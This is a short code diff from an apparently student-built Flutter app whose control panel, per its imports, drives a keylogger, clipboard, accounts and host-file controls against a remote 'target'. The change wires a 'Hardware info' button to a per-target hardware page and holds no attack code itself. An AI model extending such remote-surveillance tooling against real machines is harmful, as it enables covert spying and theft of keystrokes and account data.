@@ -7,6 +7,7 @@ import 'package:inferno_core_fyp/res/constants.dart';
 import 'package:inferno_core_fyp/res/helper_extensions.dart';
 import 'package:inferno_core_fyp/view/controls/accounts.dart';
 import 'package:inferno_core_fyp/view/controls/clipboard.dart';
+import 'package:inferno_core_fyp/view/controls/harware_info.dart';
 import 'package:inferno_core_fyp/view/controls/host_file.dart';
 import 'package:inferno_core_fyp/view/controls/keylogger.dart';
 import 'package:inferno_core_fyp/view/controls/network.dart';
@@ -109,10 +110,12 @@ class _ControlPanelState extends State<ControlPanel> {
                   //   onTap: () {},
                   // ),
                   CommandItem(
-                    text: "Hardware",
+                    text: "Hardware info",
                     icon: Icons.hardware,
                     iconSize: 29,
-                    onTap: () {},
+                    onTap: () {
+                      Get.to(() => HardwareInfoPage(targetId: widget.targetId));
+                    },
                   ),
                   CommandItem(
                     text: "Programs",
